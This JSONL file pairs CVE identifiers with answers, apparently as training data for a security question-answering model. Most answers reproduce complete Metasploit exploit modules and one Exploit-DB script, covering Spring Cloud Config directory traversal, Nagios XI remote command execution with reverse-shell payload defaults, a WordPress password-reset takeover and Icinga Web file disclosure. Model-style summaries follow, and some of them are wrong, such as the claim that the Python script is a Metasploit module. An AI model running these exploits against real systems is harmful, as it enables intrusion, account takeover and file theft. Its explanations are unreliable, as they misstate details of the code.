{"query": "CVE-2016-10073", "Answer": "Based on the context provided, CVE-2016-10073 refers to a vulnerability affecting Oracle Hospitality's Guest Access component using Apache Commons FileUpload. This vulnerability is classified as having a base score of 9.8, making it a critical severity level. It is exploitable over a network without requiring user authentication, increasing the threat posed to affected systems. The supported versions known to be vulnerable include 4.2.0 and 4.2.1.This vulnerability likely stems from improper input validation in the Apache Commons FileUpload library, allowing an attacker to upload specially crafted files containing malicious code. Once the file is uploaded, the attacker can potentially execute arbitrary commands on the targeted system, leading to serious consequences including data theft, unauthorized access, or even complete system compromise.To mitigate the risks associated with this vulnerability, organizations should update their installations of Oracle Hospitality's Guest Access component to a patched version as soon as possible. Additionally, implementing proper input validation techniques and restricting file types allowed for upload can help prevent attacks based on this vulnerability."}
{"query": "CVE-2020-5410", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Report  include Msf::Auxiliary::Scanner  include Msf::Exploit::Remote::HttpClient  def initialize(info = {})    super(      update_info(        info,        'Name' => 'Directory Traversal in Spring Cloud Config Server',        'Description' => %q{          This module exploits an unauthenticated directory traversal vulnerability          which exists in Spring Cloud Config versions 2.2.x prior to 2.2.3 and          2.1.x prior to 2.1.9, and older unsupported versions. Spring          Cloud Config listens by default on port 8888.        },        'References' => [          ['CVE', '2020-5410'],          ['URL', 'https://tanzu.vmware.com/security/cve-2020-5410'],          ['URL', 'https://xz.aliyun.com/t/7877']        ],        'Author' => [          'Fei Lu', # Vulnerability discovery          'bfpiaoran@qq.com', # Vulnerability discovery          'Dhiraj Mishra' # Metasploit module        ],        'DisclosureDate' => '2020-06-01',        'License' => MSF_LICENSE,        'Notes' => {          'Stability' => [CRASH_SAFE],          'SideEffects' => [IOC_IN_LOGS],          'Reliability' => []        }      )    )    register_options(      [        Opt::RPORT(8888),        OptString.new('TARGETURI', [true, 'The base path to Spring Cloud Config installation', '/']),        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 11 ])      ]    )  end  def run_host(ip)    traversal = '../' * datastore['DEPTH']    traversal = \"#{traversal}#{datastore['FILEPATH']}\"    traversal = traversal.gsub('/', '%252F')    traversal << '%23foo/development'    trav_uri = normalize_uri(target_uri.path, traversal)    res = send_request_raw({      'method' => 'GET',      'uri' => trav_uri    })    unless res && res.code == 200      print_error('Nothing was downloaded')      return    end    print_good(\"#{peer} - Downloaded #{res.body.length} bytes\")    path = store_loot(      'springcloud.traversal',      'text/plain',      ip,      res.body    )    print_good(\"File saved in: #{path}\")  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Report  include Msf::Auxiliary::Scanner  include Msf::Exploit::Remote::HttpClient  def initialize(info = {})    super(      update_info(        info,        'Name' => 'Directory Traversal in Spring Cloud Config Server',        'Description' => %q{          This module exploits an unauthenticated directory traversal vulnerability          which exists in Spring Cloud Config versions 2.2.x prior to 2.2.3 and          2.1.x prior to 2.1.9, and older unsupported versions. Spring          Cloud Config listens by default on port 8888.        },        'References' => [          ['CVE', '2020-5410'],          ['URL', 'https://tanzu.vmware.com/security/cve-2020-5410'],          ['URL', 'https://xz.aliyun.com/t/7877']        ],        'Author' => [          'Fei Lu', # Vulnerability discovery          'bfpiaoran@qq.com', # Vulnerability discovery          'Dhiraj Mishra' # Metasploit module        ],        'DisclosureDate' => '2020-06-01',        'License' => MSF_LICENSE,        'Notes' => {          'Stability' => [CRASH_SAFE],          'SideEffects' => [IOC_IN_LOGS],          'Reliability' => []        }      )    )    register_options(      [        Opt::RPORT(8888),        OptString.new('TARGETURI', [true, 'The base path to Spring Cloud Config installation', '/']),        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 11 ])      ]    )  end  def run_host(ip)    traversal = '../' * datastore['DEPTH']    traversal = \"#{traversal}#{datastore['FILEPATH']}\"    traversal = traversal.gsub('/', '%252F')    traversal << '%23foo/development'    trav_uri = normalize_uri(target_uri.path, traversal)    res = send_request_raw({      'method' => 'GET',      'uri' => trav_uri    })    unless res && res.code == 200      print_error('Nothing was downloaded')      return    end    print_good(\"#{peer} - Downloaded #{res.body.length} bytes\")    path = store_loot(      'springcloud.traversal',      'text/plain',      ip,      res.body    )    print_good(\"File saved in: #{path}\")  endend       Question: CVE-2020-5410[/INST] CVE-2020-5410 is an identifier for a specific vulnerability in the Spring Cloud Config server. According to the provided context, this vulnerability allows for an unauthenticated directory traversal attack against Spring Cloud Config versions 2.2.x prior to 2.2.3 and 2.1.x prior to 2.1.9. The vulnerability can be exploited to read sensitive files on the targeted system.In the given code snippet, two Metasploit modules are presented, each designed to take advantage of this vulnerability. Both modules share the same name, options, and descriptions but differ slightly in their implementations. They utilize the 'send\\_request\\_raw' method to make GET requests to the targeted Spring Cloud Config server with crafted URI paths containing directory traversal sequences. If successful, the modules save the downloaded content as loot and report the outcome."}
{"query": "CVE-2019-15949", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Exploit::Remote  Rank = ExcellentRanking  include Msf::Exploit::Remote::HttpClient  include Msf::Exploit::Remote::HTTP::NagiosXi  include Msf::Exploit::CmdStager  prepend Msf::Exploit::Remote::AutoCheck  include Msf::Module::Deprecated  moved_from 'exploit/linux/http/nagios_xi_authenticated_rce'  def initialize(info = {})    super(      update_info(        info,        'Name' => 'Nagios XI Prior to 5.6.6 getprofile.sh Authenticated Remote Command Execution',        'Description' => %q{          This module exploits a vulnerability in the getprofile.sh script          of Nagios XI prior to 5.6.6 in order to upload a malicious check_ping          plugin and thereby execute arbitrary commands.          For Nagios XI 5.2.0-5.4.13, the commands are run as the nagios user.          For versions 5.5.0-5.6.5 the commands are run as root. Note that versions          prior to 5.2.0 will still be marked as being vulnerable however this          module does not presently support exploiting these targets.          The module uploads a malicious check_ping plugin to the Nagios XI server via          /admin/monitoringplugins.php and then executes this plugin by issuing          a HTTP GET request to download a system profile from the server.          For all supported targets except Linux (cmd), the module uses a command          stager to write the exploit to the target via the malicious plugin.          This may not work if Nagios XI is running in a restricted Unix environment,          so in that case the target must be set to Linux (cmd). The module then          writes the payload to the malicious plugin while avoiding commands          that may not be supported.          Valid credentials for a user with administrative privileges are          required. This module was successfully tested on Nagios XI 5.3.0 and          Nagios 5.6.5, both running on CentOS 7. For vulnerable versions before          5.5.0, it may take a significant amount of time for the payload to get          back (up to 5 minutes). If exploitation fails against an older system,          it is recommended to increase the WfsDelay setting (default is 300          seconds). See the documentation for more information.        },        'License' => MSF_LICENSE,        'Author' => [          'Jak Gibb', # https://github.com/jakgibb/ - Discovery and exploit          'Erik Wynter' # @wyntererik - Metasploit        ],        'References' => [          ['CVE', '2019-15949'],          ['URL', 'https://github.com/jakgibb/nagiosxi-root-rce-exploit'] # original PHP exploit        ],        'Payload' => { 'BadChars' => \"\\x00\" },        'Targets' => [          [            'Linux (x86)', {              'Arch' => ARCH_X86,              'Platform' => 'linux',              'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' }            }          ],          [            'Linux (x64)', {              'Arch' => ARCH_X64,              'Platform' => 'linux',              'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' }            }          ],          [            'Linux (cmd)', {              'Arch' => ARCH_CMD,              'Platform' => 'unix',              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' },              'Payload' => { 'Append' => ' & disown', # the payload must be disowned after execution, otherwise cleanup fails 'BadChars' => '\"'              }            }          ]        ],        'Privileged' => true,        'DisclosureDate' => '2019-07-29',        'DefaultOptions' => { 'WfsDelay' => 300 }, # Necessary because the payload connects back with a significant delay. On versions older than 5.5.0 it takes especially long.        'DefaultTarget' => 1,        'Notes' => {          'Stability' => [ CRASH_SAFE, ],          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, CONFIG_CHANGES ],          'Reliability' => []        }      )    )    register_options [      OptString.new('USERNAME', [true, 'Username to authenticate with', 'nagiosadmin']),      OptString.new('PASSWORD', [true, 'Password to authenticate with', nil])    ]  end  def username    datastore['USERNAME']  end  def password    datastore['PASSWORD']  end  def finish_install    datastore['FINISH_INSTALL']  end  def check    # Use nagios_xi_login to try and authenticate. If authentication succeeds, nagios_xi_login returns    # an array containing the http response body of a get request to index.php and the session cookies    auth_result, err_msg, @auth_cookies, @version = authenticate(username, password, finish_install)    case auth_result    when AUTH_RESULTS[:connection_failed]      return CheckCode::Unknown(err_msg)    when AUTH_RESULTS[:unexpected_error], AUTH_RESULTS[:not_fully_installed], AUTH_RESULTS[:failed_to_handle_license_agreement], AUTH_RESULTS[:failed_to_extract_tokens], AUTH_RESULTS[:unable_to_obtain_version]      return CheckCode::Detected(err_msg)    when AUTH_RESULTS[:not_nagios_application]      return CheckCode::Safe(err_msg)    end    if @version < Rex::Version.new('5.6.6')      return CheckCode::Appears    end    return CheckCode::Safe  end  def grab_plugins_nsp    # visit the plugins page to grab the nsp token required for uploading the payload    res = send_request_cgi({      'uri' => @monitoring_plugins_url,      'method' => 'GET',      'cookie' => @auth_cookies    })    unless res      fail_with(Failure::Disconnected, \"Connection failed while trying to visit `#{@monitoring_plugins_url}`\")    end    unless res.code == 200 && res.body.include?('<title>Manage Plugins &middot; Nagios XI</title>')      fail_with(Failure::UnexpectedReply, \"Unexpected response received while trying to visit `#{@monitoring_plugins_url}`\")    end    @nsp = get_nsp(res)    if @nsp.blank?      fail_with(Failure::Unknown, 'Failed to obtain the nsp token required to upload the payload')    end  end  def execute_command(cmd, _opts = {})    print_status(\"Uploading malicious 'check_ping' plugin...\")    post_data = Rex::MIME::Message.new    post_data.add_part(Rex::Text.rand_text_numeric(8), nil, nil, 'form-data; name=\"upload\"')    post_data.add_part(@nsp, nil, nil, 'form-data; name=\"nsp\"')    post_data.add_part(Rex::Text.rand_text_numeric(8), nil, nil, 'form-data; name=\"MAX_FILE_SIZE\"')    post_data.add_part(cmd, 'text/plain', nil, 'form-data; name=\"uploadedfile\"; filename=\"check_ping\"')    # upload payload    res = send_request_cgi({      'method' => 'POST',      'uri' => @monitoring_plugins_url,      'cookie' => @auth_cookies,      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",      'data' => post_data.to_s    })    unless res      fail_with Failure::Unreachable, 'Upload failed'    end    unless res.code == 200 && res.body.include?('New plugin was installed successfully')      fail_with Failure::Unknown, 'Failed to upload plugin.'    end    @plugin_installed = true  end  # This request will timeout. It has to, for the exploit to work.  def execute_payload    print_status('Executing plugin...')    send_request_cgi({      'uri' => normalize_uri(target_uri.path, 'includes', 'components', 'profile', 'profile.php'),      'method' => 'GET',      'cookie' => @auth_cookies,      'vars_get' => { 'cmd' => 'download' }    }, 0)  end  def cleanup    return unless @plugin_installed    print_status(\"Deleting malicious 'check_ping' plugin...\")    res = send_request_cgi({      'uri' => @monitoring_plugins_url,      'method' => 'GET',      'cookie' => @auth_cookies,      'vars_get' => {        'delete' => 'check_ping',        'nsp' => @nsp      }    })    unless res      print_warning(\"Failed to delete the malicious 'check_ping' plugin: Connection failed. Manual cleanup is required.\")      return    end    unless res.code == 200 && res.body.include?('Plugin deleted')      print_warning(\"Failed to delete the malicious 'check_ping' plugin. Manual cleanup is required.\")      return    end    print_good('Plugin deleted.')  end  def exploit    unless @auth_cookies.present?      auth_result, err_msg, @auth_cookies, @version = authenticate(username, password, finish_install)      case auth_result      when AUTH_RESULTS[:connection_failed]        return CheckCode::Unknown(err_msg)      when AUTH_RESULTS[:unexpected_error], AUTH_RESULTS[:not_fully_installed], AUTH_RESULTS[:failed_to_handle_license_agreement], AUTH_RESULTS[:failed_to_extract_tokens], AUTH_RESULTS[:unable_to_obtain_version]        return CheckCode::Detected(err_msg)      when AUTH_RESULTS[:not_nagios_application]        return CheckCode::Safe(err_msg)      end    end    @monitoring_plugins_url = normalize_uri(target_uri.path, 'admin', 'monitoringplugins.php')    grab_plugins_nsp    wfsdelay = datastore['WfsDelay']    if @version < Rex::Version.new('5.2.0')      fail_with(Failure::NoTarget, \"Target is vulnerable but this module does not support exploiting NagiosXI #{@version} at this time.\")    end    if target.arch.first == ARCH_CMD      execute_command(payload.encoded)      message = \"Waiting up to #{wfsdelay} seconds for the payload to connect back...\"    else      execute_cmdstager(background: true)      message = \"Waiting up to #{wfsdelay} seconds for the plugin to request the final payload...\"    end    if @version >= Rex::Version.new('5.2.0') && @version < Rex::Version.new('5.5.0')      print_warning(\"For NagiosXi version #{@version} it may take serveral minutes for a session to open. If the module times out, try increasing the `WfsDelay` value.\")    end    print_good('Successfully uploaded plugin.')    execute_payload    print_status(message)  endend       Question: CVE-2019-15949[/INST] CVE-2019-15949 is a vulnerability in Nagios XI prior to version 5.6.6 that allows an attacker to execute arbitrary commands through a specially crafted check\\_ping plugin. This vulnerability affects Nagios XI installations and can lead to serious consequences if exploited.To understand this vulnerability better, let's examine its details:1. Target: Nagios XI2. Version affected: Prior to 5.6.63. Description: The vulnerability lies in the way Nagios XI handles the installation and execution of custom plugins, specifically the check\\_ping plugin. By providing a maliciously crafted plugin, an attacker can execute arbitrary commands on the targeted system.4. Impact: Depends on the specific actions taken within the exploited plugin, but it can potentially allow the attacker to gain control of the Nagios XI instance and perform various tasks, including data exfiltration, privilege escalation, and denial-of-service attacks.5. Mitigation: Upgrade Nagios XI to version 5.6.6 or newer to address the vulnerability. Alternatively, restrict access to the monitoringplugins.php interface and ensure proper access controls are implemented to prevent unauthorized plugin installations.As shown in the given Metasploit module code snippet, the exploit involves several steps:1. Authentication: First, the attacker authenticates to the Nagios XI instance using their credentials.2. Plugin Installation: Next, the attacker uploads a malicious check\\_ping plugin to the Nagios XI server.3. Payload Execution: Once the plugin is installed, the attacker triggers it to execute their payload, typically a reverse shell or other type of malicious code.4. Cleanup: Finally, the attacker cleans up the malicious plugin to avoid detection.This vulnerability highlights the importance of keeping software up-to-date and implementing strong access controls to protect against potential threats."}
{"query": "CVE-2020-35234", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HTTP::Wordpress  include Msf::Auxiliary::Scanner  def initialize(info = {})    super(      update_info(        info,        'Name' => 'WordPress Easy WP SMTP Password Reset',        'Description' => %q{          Wordpress plugin Easy WP SMTP versions <= 1.4.2 was found to not include index.html within its plugin folder.          This potentially allows for directory listings.  If debug mode is also enabled for the plugin, all SMTP          commands are stored in a debug file.  An email must have been sent from the system as well to create the debug          file.  If an email hasn't been sent (Test Email function not included), Aggressive can bypass the last check.          Combining these items, it's possible to request a password reset for an account, then view the debug file to determine          the link that was emailed out, and reset the user's password.        },        'Author' => [          'h00die', # msf module          # this was an 0day        ],        'License' => MSF_LICENSE,        'References' => [          ['URL', 'https://wordpress.org/support/topic/security-issue-with-debug-log/'],          ['URL', 'https://blog.nintechnet.com/wordpress-easy-wp-smtp-plugin-fixed-zero-day-vulnerability/'],          ['URL', 'https://plugins.trac.wordpress.org/changeset/2432768/easy-wp-smtp'],          ['WPVDB', '10494'],          ['CVE', '2020-35234']        ],        'Notes' => {          'Stability' => [CRASH_SAFE],          'Reliability' => [],          'SideEffects' => [IOC_IN_LOGS]        },        'DisclosureDate' => '2020-12-06'      )    )    register_options [      OptString.new('USER', [false, 'Username to reset the password for', 'Admin']),      OptBool.new('AGGRESSIVE', [false, 'Proceed if debug file not found', false]),    ]  end  def get_debug_file(aggressive)    print_status('Checking for debug_log file')    res = send_request_cgi({      'method' => 'GET',      'uri' => \"#{normalize_uri(target_uri.path, 'wp-content', 'plugins', 'easy-wp-smtp')}/\" # trailing / to browse directory    })    fail_with Failure::Unreachable, 'Connection failed' unless res    # find the debug file name, prefix during my testing was 14 alpha-numeric    unless />\\s*(?<debug_log>\\w{5,15}_debug_log\\.txt)/ =~ res.body      unless aggressive        fail_with Failure::NotVulnerable, 'Either debug log not turned on, or directory listings disabled.  Try AGGRESSIVE mode if this is a false positive'      end      print_error('Debug file not found, bypassing check due to AGGRESSIVE mode')    end    debug_log  end  def run_host(ip)    unless wordpress_and_online?      fail_with Failure::NotVulnerable, 'Server not online or not detected as wordpress'    end    checkcode = check_plugin_version_from_readme('easy-wp-smtp', '1.4.2')    unless [Msf::Exploit::CheckCode::Vulnerable, Msf::Exploit::CheckCode::Appears, Msf::Exploit::CheckCode::Detected].include?(checkcode)      fail_with Failure::NotVulnerable, 'A vulnerable version of Easy WP SMTP was not found'    end    print_good('Vulnerable version of Easy WP SMTP detected')    debug_log = get_debug_file(datastore['AGGRESSIVE'])    if debug_log      print_good(\"Found debug log: #{normalize_uri(target_uri.path, 'wp-content', 'plugins', 'easy-wp-smtp', debug_log)}\")    end    print_status(\"Sending password reset for #{datastore['USER']}\")    res = send_request_cgi({      'method' => 'POST',      'uri' => normalize_uri(target_uri.path, 'wp-login.php'),      'vars_get' => {        'action' => 'lostpassword'      },      'vars_post' => {        'user_login' => datastore['USER'],        'redirect_to' => '',        'wp-submit' => 'Get New Password'      }    })    fail_with Failure::Unreachable, 'Connection failed' unless res    fail_with Failure::NotVulnerable, 'Site not configured to submit new password request' if res.body.include?('The email could not be sent')    fail_with Failure::Unknown, 'Unable to submit new password request' unless res.code == 302    unless debug_log      Rex.sleep(2) # give the log file time to write if it wasn't there already      debug_log = get_debug_file(false) # die if file not found    end    res = send_request_cgi({      'method' => 'GET',      'uri' => normalize_uri(target_uri.path, 'wp-content', 'plugins', 'easy-wp-smtp', debug_log)    })    loot = store_loot(debug_log, 'text/plain', ip, res.body)    print_good(\"Debug log saved to #{loot}.  Manual review for possible SMTP password, and other information.\")    c2s = 'CLIENT -> SERVER:\\s+'    # this is an ugly regex, but the username, and link span multiple lines    res.body.scan(/#{c2s}Username: (?<username>\\w+)\\s+#{c2s}#{c2s}If this was a mistake, just ignore this email and nothing will happen.\\s+#{c2s}#{c2s}To reset your password, visit the following address:\\s+#{c2s}#{c2s}(?<link>[^\]+)/).each do |match|      if datastore['USER'] == match[0]        print_good(\"#{match[0]} password reset: #{match[1]}\")        next      end      print_status(\"#{match[0]} password reset: #{match[1]}\")    end    print_status('Finished enumerating resets.  Last one most likely to succeed')  endend       Question: CVE-2020-35234[/INST] CVE-2020-35234 is a vulnerability affecting the WordPress plugin Easy WP SMTP. It allows an attacker to reset a user's password by exploiting a directory listing issue and viewing the debug file containing the link to the password reset page. The vulnerability affects versions of the plugin below 1.4.2. Here's how you can leverage this vulnerability using Metasploit:First, ensure you have Metasploit installed. Once you have Metasploit, you can load the auxiliary module responsible for exploiting this vulnerability by running `use auxiliary/scanner/http/wordpress_easy_wp_smtp_password_reset`. After loading the module, configure it with the target URL and desired options, including the user whose password you wish to reset. Finally, run the scan against the target by executing the command `run`.Metasploit will attempt to locate the debug file by sending a GET request to the plugin directory and checking for its presence in the response body. If successful, it will extract the link to the password reset page and display it. If the 'AGGRESSIVE' option is set to true, Metasploit will continue attempting to retrieve the debug file even if it isn't initially present.Keep in mind that this vulnerability requires the debug logging feature to be enabled, and an email must have been previously sent from the system to generate the debug file. Additionally, the targeted user's login credentials are necessary to initiate the password reset process."}
{"query": "CVE-2022-24716", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Scanner  include Msf::Auxiliary::Report  def initialize(info = {})    super(      update_info(        info,        'Name' => 'Icingaweb Directory Traversal in Static Library File Requests',        'Description' => %q{          Icingaweb versions from 2.9.0 to 2.9.5 inclusive, and 2.8.0 to 2.8.5 inclusive suffer from an          unauthenticated directory traversal vulnerability. The vulnerability is triggered          through the icinga-php-thirdparty library, which allows unauthenticated users          to retrieve arbitrary files from the targets filesystem via a GET request to          /lib/icinga/icinga-php-thirdparty/<absolute path to target file on disk> as the user          running the Icingaweb server, which will typically be the www-data user.          This can then be used to retrieve sensitive configuration information from the target          such as the configuration of various services, which may reveal sensitive login          or configuration information, the /etc/passwd file to get a list of valid usernames          for password guessing attacks, or other sensitive files which may exist as part of          additional functionality available on the target server.          This module was tested against Icingaweb 2.9.5 running on Docker.        },        'License' => MSF_LICENSE,        'Author' => [          'h00die', # msf module          'Jacob Ebben', # EDB          'Thomas Chauchefoin' # initial POC and discovery        ],        'References' => [          ['EDB', '51329'],          ['URL', 'https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/'],          ['URL', 'https://github.com/Icinga/icingaweb2/security/advisories/GHSA-5p3f-rh28-8frw'],          ['URL', 'https://github.com/Icinga/icingaweb2/commit/9931ed799650f5b8d5e1dc58ea3415a4cdc5773d'],          ['CVE', '2022-24716'],        ],        'Targets' => [          ['Icingaweb', {}],        ],        'Notes' => {          'Stability' => [CRASH_SAFE],          'Reliability' => [REPEATABLE_SESSION],          'SideEffects' => [IOC_IN_LOGS]        },        'DisclosureDate' => '2022-05-09',        'DefaultTarget' => 0      )    )    register_options(      [        Opt::RPORT(8080),        OptString.new('TARGETURI', [true, 'The URI of the Icinga Application', '/']),        OptString.new('FILE', [true, 'File to retrieve', '/etc/icinga2/icinga2.conf']) # https://icinga.com/docs/icinga-2/latest/doc/04-configuration/#configuration-overview      ]    )  end  def check_host(_ip)    res = send_request_cgi!(      'uri' => normalize_uri(target_uri.path)    )    return Exploit::CheckCode::Unknown(\"#{peer} - Could not connect to web service - no response\") if res.nil?    return Exploit::CheckCode::Unknown(\"#{peer} - Page didn't load correctly (response code: #{res.code}), check TARGETURI/port?\") unless res.code == 200    return Exploit::CheckCode::Unknown(\"#{peer} - Page doesn't have a body, check TARGETURI/port?\") if res.body.nil?    return Exploit::CheckCode::Detected(\"#{peer} - Icinga Web 2 found, unable to determine version.\") if res.body.include?('<meta name=\"application-name\" content=\"Icinga Web 2\">')    return Exploit::CheckCode::Safe(\"#{peer} - Web server found, but couldn't detect Icinga\")  end  def run_host(ip)    vprint_status('Attempting to retrieve file')    res = send_request_cgi!(      'uri' => normalize_uri(target_uri.path, 'lib', 'icinga', 'icinga-php-thirdparty', datastore['FILE'])    )    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?    fail_with(Failure::UnexpectedReply, \"#{peer} - Page didn't load correctly. Most likely file doesn't exist (response code: #{res.code})\") unless res.code == 200    fail_with(Failure::UnexpectedReply, \"#{peer} - Page didn't load correctly, no body found\") if res.body.nil?    if !res.body.empty?      print_good(res.body)      loot_path = store_loot('icinga file', 'text/plain', ip, res.body, datastore['FILE'])      print_good(\"#{datastore['FILE']} saved to #{loot_path}\")    else      print_error('Response has 0 size.')    end  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Scanner  include Msf::Auxiliary::Report  def initialize(info = {})    super(      update_info(        info,        'Name' => 'Icingaweb Directory Traversal in Static Library File Requests',        'Description' => %q{          Icingaweb versions from 2.9.0 to 2.9.5 inclusive, and 2.8.0 to 2.8.5 inclusive suffer from an          unauthenticated directory traversal vulnerability. The vulnerability is triggered          through the icinga-php-thirdparty library, which allows unauthenticated users          to retrieve arbitrary files from the targets filesystem via a GET request to          /lib/icinga/icinga-php-thirdparty/<absolute path to target file on disk> as the user          running the Icingaweb server, which will typically be the www-data user.          This can then be used to retrieve sensitive configuration information from the target          such as the configuration of various services, which may reveal sensitive login          or configuration information, the /etc/passwd file to get a list of valid usernames          for password guessing attacks, or other sensitive files which may exist as part of          additional functionality available on the target server.          This module was tested against Icingaweb 2.9.5 running on Docker.        },        'License' => MSF_LICENSE,        'Author' => [          'h00die', # msf module          'Jacob Ebben', # EDB          'Thomas Chauchefoin' # initial POC and discovery        ],        'References' => [          ['EDB', '51329'],          ['URL', 'https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/'],          ['URL', 'https://github.com/Icinga/icingaweb2/security/advisories/GHSA-5p3f-rh28-8frw'],          ['URL', 'https://github.com/Icinga/icingaweb2/commit/9931ed799650f5b8d5e1dc58ea3415a4cdc5773d'],          ['CVE', '2022-24716'],        ],        'Targets' => [          ['Icingaweb', {}],        ],        'Notes' => {          'Stability' => [CRASH_SAFE],          'Reliability' => [REPEATABLE_SESSION],          'SideEffects' => [IOC_IN_LOGS]        },        'DisclosureDate' => '2022-05-09',        'DefaultTarget' => 0      )    )    register_options(      [        Opt::RPORT(8080),        OptString.new('TARGETURI', [true, 'The URI of the Icinga Application', '/']),        OptString.new('FILE', [true, 'File to retrieve', '/etc/icinga2/icinga2.conf']) # https://icinga.com/docs/icinga-2/latest/doc/04-configuration/#configuration-overview      ]    )  end  def check_host(_ip)    res = send_request_cgi!(      'uri' => normalize_uri(target_uri.path)    )    return Exploit::CheckCode::Unknown(\"#{peer} - Could not connect to web service - no response\") if res.nil?    return Exploit::CheckCode::Unknown(\"#{peer} - Page didn't load correctly (response code: #{res.code}), check TARGETURI/port?\") unless res.code == 200    return Exploit::CheckCode::Unknown(\"#{peer} - Page doesn't have a body, check TARGETURI/port?\") if res.body.nil?    return Exploit::CheckCode::Detected(\"#{peer} - Icinga Web 2 found, unable to determine version.\") if res.body.include?('<meta name=\"application-name\" content=\"Icinga Web 2\">')    return Exploit::CheckCode::Safe(\"#{peer} - Web server found, but couldn't detect Icinga\")  end  def run_host(ip)    vprint_status('Attempting to retrieve file')    res = send_request_cgi!(      'uri' => normalize_uri(target_uri.path, 'lib', 'icinga', 'icinga-php-thirdparty', datastore['FILE'])    )    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?    fail_with(Failure::UnexpectedReply, \"#{peer} - Page didn't load correctly. Most likely file doesn't exist (response code: #{res.code})\") unless res.code == 200    fail_with(Failure::UnexpectedReply, \"#{peer} - Page didn't load correctly, no body found\") if res.body.nil?    if !res.body.empty?      print_good(res.body)      loot_path = store_loot('icinga file', 'text/plain', ip, res.body, datastore['FILE'])      print_good(\"#{datastore['FILE']} saved to #{loot_path}\")    else      print_error('Response has 0 size.')    end  endendEXPLOIT: #!/usr/bin/env python3# Exploit Title: Icinga Web 2.10 - Arbitrary File Disclosure# Date: 2023-03-19# Exploit Author: Jacob Ebben# Vendor Homepage: https://icinga.com/# Software Link: https://github.com/Icinga/icingaweb2# Version: <2.8.6, <2.9.6, <2.10# Tested on: Icinga Web 2 Version 2.9.2 on Linux# CVE: CVE-2022-24716# Based on: https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/import argparseimport requestsfrom termcolor import colored# Code for: def print_message(message, type):# Code for: def get_normalized_url(url):# Code for: def get_proxy_protocol(url):parser = argparse.ArgumentParser(description='Arbitrary File Disclosure Vulnerability in Icinga Web <2.8.6, <2.9.6, <2.10')parser.add_argument('TARGET', type=str, help='Target Icinga location (Example: http://localhost:8080/icinga2/ or https://victim.xyz/icinga/)')parser.add_argument('FILE', type=str, help='Filename to gather from exploit (Example: \"/etc/passwd\" or \"/etc/icingaweb2/config.ini\")')parser.add_argument('-P','--proxy', type=str, help='HTTP proxy address (Example: http://127.0.0.1:8080/)')args = parser.parse_args()if args.proxy:    proxy_url = get_normalized_url(args.proxy)    proxy_protocol = get_proxy_protocol(proxy_url)    proxies = { proxy_protocol: proxy_url }else:    proxies = {}base_url = get_normalized_url(args.TARGET)exploit_url = base_url + \"lib/icinga/icinga-php-thirdparty\" + args.FILErequest = requests.get(base_url, proxies=proxies)if request.status_code == 404:\tprint_message(\"Could not connect to provided URL!\", \"ERROR\")\texit()request = requests.get(exploit_url, proxies=proxies)file_content = request.textprint(file_content)       Question: CVE-2022-24716[/INST] CVE-2022-24716 is a vulnerability affecting Icinga Web versions prior to 2.8.6, 2.9.6, and 2.10. This vulnerability allows an attacker to traverse directories and retrieve arbitrary files from the targeted system. The vulnerability is due to improper validation of user inputs in the icinga-php-thirdparty library. An attacker can exploit this vulnerability by making a specially crafted HTTP request to the targeted system.In the given context, there are two Metasploit modules presented, each designed to exploit this vulnerability. Both modules share similar functionalities, including scanning for the vulnerable version of Icinga Web, sending a crafted HTTP request to retrieve a specified file, and saving the retrieved file to a local loot folder. However, they differ slightly in terms of their configurations and reporting mechanisms.The first module uses Ruby programming language and includes several auxiliary features like reporting, scanning, and normalizing URIs. It prints the results directly to the console and saves the looted files to a predefined loot folder.The second module is written in Python and utilizes the popular Metasploit framework. It shares most of its functionality with the first module but offers more advanced features like handling HTTP proxies and providing more detailed error messages. Additionally, it stores the looted files in a default loot folder defined by the Metasploit framework.Both modules serve the same purpose and can effectively be used to exploit the CVE-2022-24716 vulnerability in Icinga Web. The choice between them depends on personal preferences, familiarity with specific programming languages, and desired features."}
